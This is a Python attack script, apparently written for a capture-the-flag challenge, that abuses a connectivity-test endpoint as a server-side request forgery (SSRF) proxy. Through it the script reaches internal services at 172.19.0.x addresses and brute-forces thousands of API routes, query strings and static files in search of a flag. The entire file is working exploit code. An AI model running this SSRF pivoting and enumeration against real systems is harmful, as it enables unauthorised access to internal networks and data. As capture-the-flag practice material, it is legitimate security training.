#!/usr/bin/env python3
import concurrent.futures
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "9taux6shw8cpbvs5.instances.ctfcup.online"
BASE = f"http://{HOST}"
OUT = "/tmp/web-out"
os.makedirs(OUT, exist_ok=True)
JSONL = os.path.join(OUT, "probe5.jsonl")
SUMMARY = os.path.join(OUT, "SUMMARY5.txt")
ctx = ssl._create_unverified_context()
FLAG_RE = re.compile(r"ctfcup\{[^}]+\}")
jsonl_f = open(JSONL, "w", encoding="utf-8", buffering=1)
summary_f = open(SUMMARY, "w", encoding="utf-8", buffering=1)

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))

def emit(rec):
    rec = dict(rec)
    if isinstance(rec.get("body"), str) and len(rec["body"]) > 40000:
        rec["body"] = rec["body"][:40000]
        rec["truncated"] = True
    line = json.dumps(rec, ensure_ascii=False)
    jsonl_f.write(line + "\n")
    flags = FLAG_RE.findall(line)
    if flags:
        summary_f.write(f"FLAG {flags} :: {line[:12000]}\n")
    summary_f.flush()
    return rec

def note(text):
    print(text, flush=True)
    summary_f.write(text + "\n")
    summary_f.flush()

def section(title):
    note(f"\n===== {title} =====")

def call_ssrf(target, timeout=12):
    q = urllib.parse.urlencode({"target": target})
    req = urllib.request.Request(
        f"{BASE}/api/diagnostics/connectivity-test?{q}",
        headers={"User-Agent": "Mozilla/5.0 v1-probe", "Accept": "application/json"},
    )
    started = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(2_000_000)
            outer = r.status
    except urllib.error.HTTPError as e:
        raw = e.read(2_000_000)
        outer = e.code
    except Exception as e:
        return {"target": target, "kind": "outer-error", "error": f"{type(e).__name__}: {e}", "elapsed": round(time.time()-started,3)}
    elapsed = round(time.time() - started, 3)
    try:
        data = json.loads(raw.decode("utf-8", "replace"))
    except Exception:
        return {"target": target, "kind": "outer-nonjson", "outer_status": outer, "body": raw.decode("utf-8","replace")[:40000], "elapsed": elapsed}
    if "body" in data or isinstance(data.get("status"), int):
        kind = "http"
    else:
        err = str(data.get("error", ""))
        if "Connection refused" in err: kind = "refused"
        elif "name resolution" in err: kind = "dns"
        elif "timed out" in err: kind = "timeout"
        elif "No route" in err: kind = "noroute"
        elif "reset" in err or "Remote end closed" in err or "EOF" in err: kind = "reset"
        else: kind = "error"
    return {"target": target, "kind": kind, "outer_status": outer, "elapsed": elapsed, **data}

def ssrf(host, port, path):
    return call_ssrf(f"http://mme-monitor@{host}:{port}{path}")

def interesting(rec):
    if rec.get("kind") != "http":
        return rec.get("kind") not in {"refused", "dns", "noroute", "outer-error"}
    body = rec.get("body", "") or ""
    if rec.get("status") == 404 and ("The requested URL was not found" in body or (len(body) == 207 and "Not Found" in body)):
        return False
    return True

def run_map(jobs, fn, label, workers=16, retry_outer=True):
    results = []
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(fn, job): job for job in jobs}
        for i, fut in enumerate(concurrent.futures.as_completed(futs), 1):
            job = futs[fut]
            try:
                rec = fut.result()
            except Exception as e:
                rec = {"target": str(job), "kind": "worker-error", "error": repr(e)}
            rec["phase"] = label
            rec["job"] = job if isinstance(job, (str, int)) else list(job)
            emit(rec)
            results.append(rec)
            if interesting(rec):
                note("HIT " + json.dumps(rec, ensure_ascii=False)[:10000])
            if i % 100 == 0 or i == len(jobs):
                print(f"[{label}] {i}/{len(jobs)} elapsed={time.time()-start:.1f}s", flush=True)
    if retry_outer:
        retry_jobs = [r["job"] for r in results if r.get("kind") == "outer-error"]
        # Jobs stored as lists need converting back to tuples for endpoint jobs;
        # path-only scans use strings, endpoint tuple scans restore below.
        fixed = []
        for j in retry_jobs:
            fixed.append(tuple(j) if isinstance(j, list) else j)
        if fixed:
            section(f"RETRY OUTER ERRORS {label}: {len(fixed)}")
            time.sleep(3)
            results.extend(run_map(fixed, fn, label + "-retry", workers=4, retry_outer=False))
    return results

ENDPOINTS = [("172.19.0.2", 8081), ("172.19.0.5", 8082)]

section("SANITY")
for host, port in ENDPOINTS:
    for path in ["/v1/health", "/health", "/static/dashboard.js"]:
        rec = ssrf(host, port, path)
        rec["phase"] = "sanity"
        emit(rec)
        note(json.dumps(rec, ensure_ascii=False)[:5000])

words = [
    "health", "healthz", "ready", "status", "info", "version", "config", "settings",
    "device", "devices", "femtocell", "femtocells", "femto", "agent", "cell", "cells",
    "radio", "enb", "enodeb", "henb", "node", "nodes", "backhaul", "link", "links",
    "connection", "connections", "peer", "peers", "mme", "monitor", "monitoring",
    "s1", "s1ap", "s1-mme", "s1u", "NAS", "emm", "esm", "eps", "bearer", "bearers",
    "context", "contexts", "ue", "ues", "subscriber", "subscribers", "user", "users",
    "session", "sessions", "attach", "detach", "registration", "register", "identity",
    "authentication", "auth", "security", "guti", "imsi", "imei", "tmsi", "tai",
    "paging", "handover", "service-request", "service_request", "tau", "tracking-area-update",
    "pdn", "apn", "tunnel", "gtp", "sgw", "pgw", "spgw", "hss", "diameter", "s6a", "s11",
    "message", "messages", "event", "events", "log", "logs", "trace", "traces", "record",
    "records", "history", "archive", "memory", "cache", "cached", "stored", "storage",
    "old", "legacy", "echo", "relay", "forward", "ingest", "export", "download", "stream",
    "audit", "ticket", "tickets", "maintenance", "maintenance-ticket", "active-ticket",
    "current-ticket", "support", "dispatch", "field-support", "field_support", "service",
    "services", "management", "internal", "admin", "debug", "metrics", "diagnostics", "diag",
    "test", "ping", "flag", "capture", "pcap", "packet", "packets", "signaling", "signalling",
    "procedure", "procedures", "request", "requests", "response", "responses", "initial-ue",
    "initialue", "uplink", "downlink", "initial", "notification", "notifications",
]
roots = [
    "device", "devices", "femtocell", "femtocells", "agent", "cell", "cells", "radio",
    "mme", "monitor", "s1", "s1ap", "NAS", "emm", "esm", "eps", "session", "sessions",
    "subscriber", "subscribers", "ue", "ues", "user", "users", "context", "contexts",
    "bearer", "bearers", "log", "logs", "event", "events", "message", "messages", "trace",
    "traces", "record", "records", "history", "archive", "memory", "cache", "relay",
    "support", "dispatch", "field-support", "ticket", "tickets", "maintenance", "management",
    "diagnostics", "internal", "service", "services", "connection", "connections", "backhaul",
    "peer", "peers", "identity", "auth", "authentication", "security", "attach", "registration",
    "register", "procedure", "procedures", "request", "requests", "capture", "signaling",
]
subs = [
    "", "/", "health", "healthz", "ready", "status", "info", "version", "config", "list", "all",
    "active", "current", "latest", "last", "recent", "old", "legacy", "history", "archive",
    "stored", "cached", "search", "query", "get", "fetch", "download", "export", "stream",
    "events", "messages", "sessions", "session", "subscribers", "subscriber", "ue", "ues",
    "identity", "guti", "imsi", "imei", "tmsi", "attach", "detach", "service-request",
    "service_request", "registration", "register", "auth", "security", "ticket", "tickets",
    "maintenance-ticket", "active-ticket", "current-ticket", "issue", "verify", "validate",
    "send", "relay", "forward", "echo", "device", "devices", "FEMTO-042", "capture", "pcap",
    "packets", "packet", "procedures", "procedure", "requests", "request", "responses", "response",
    "initial-ue", "initialue", "uplink", "downlink", "records", "record", "logs", "log", "traces", "trace",
]

paths = set()
for prefix in ["/v1", "/api/v1", "/internal/v1", "/v2", "/api/v2"]:
    paths.add(prefix)
    paths.add(prefix + "/")
    for w in words:
        paths.add(f"{prefix}/{w}")
        paths.add(f"{prefix}/{w}/")
# The expensive 2-segment matrix under the confirmed /v1 prefix.
for r in roots:
    for s in subs:
        if s in {"", "/"}:
            paths.add(f"/v1/{r}{s}")
        else:
            paths.add(f"/v1/{r}/{s}")
            paths.add(f"/v1/{r}/{s}/")
# RESTful device-scoped guesses.
things = [
    "status", "info", "config", "sessions", "session", "subscribers", "ues", "logs", "events",
    "messages", "history", "tickets", "ticket", "maintenance-ticket", "active-ticket",
    "maintenance", "support", "echo", "memory", "cache", "radio", "s1", "s1ap", "NAS",
]
for coll in ["devices", "femtocells", "cells", "nodes", "device", "femtocell", "cell", "node"]:
    for ident in ["FEMTO-042", "femto-042", "042", "current", "self", "local"]:
        paths.add(f"/v1/{coll}/{ident}")
        for thing in things:
            paths.add(f"/v1/{coll}/{ident}/{thing}")
# Ticket-specific query variants are added in a later small phase.
paths = sorted(paths)
section(f"V1 ROUTE MATRIX: {len(paths)} paths per endpoint")
all_hits = []
for host, port in ENDPOINTS:
    section(f"ENDPOINT {host}:{port}")
    res = run_map(paths, lambda p, host=host, port=port: ssrf(host, port, p), f"v1-{host}-{port}", workers=16)
    all_hits.extend([r for r in res if interesting(r)])

# Query variants on the confirmed health route and likely collection routes,
# including routes that otherwise return 404 without required filters.
section("QUERY VARIANTS")
qjobs = []
base_paths = [
    "/v1/health", "/v1/logs", "/v1/events", "/v1/messages", "/v1/sessions", "/v1/records",
    "/v1/history", "/v1/subscribers", "/v1/ues", "/v1/tickets", "/v1/ticket", "/v1/devices",
    "/v1/device", "/v1/femtocell", "/v1/agent", "/v1/mme", "/v1/relay", "/v1/support",
]
queries = [
    "device=FEMTO-042", "device_id=FEMTO-042", "deviceId=FEMTO-042", "femtocell=FEMTO-042",
    "id=FEMTO-042", "active=true", "status=active", "limit=100", "limit=1000", "all=true",
    "device_id=FEMTO-042&limit=100", "device=FEMTO-042&limit=100",
]
for host, port in ENDPOINTS:
    for bp in base_paths:
        for q in queries:
            qjobs.append((host, port, f"{bp}?{q}"))
run_map(qjobs, lambda j: ssrf(j[0], j[1], j[2]), "v1-query-variants", workers=14)

# Static filename enumeration on both internal services (their static dir is
# shared with the web panel; another role-specific asset would be valuable).
section("STATIC FILE ENUMERATION")
static_jobs = []
fnames = set()
for w in words + ["index", "main", "app", "script", "bundle", "femto-agent", "mme-log-relay", "log-relay"]:
    for ext in [".js", ".css", ".html", ".json", ".txt", ".map"]:
        fnames.add(w + ext)
fnames.update({"dashboard.js", "dashboard.js.map", "style.css", "styles.css", "favicon.ico", "robots.txt"})
for host, port in ENDPOINTS:
    for fn in sorted(fnames):
        static_jobs.append((host, port, "/static/" + fn))
run_map(static_jobs, lambda j: ssrf(j[0], j[1], j[2]), "static-enum", workers=16)

section("DONE")
note("probe5 complete")
jsonl_f.close()
summary_f.close()
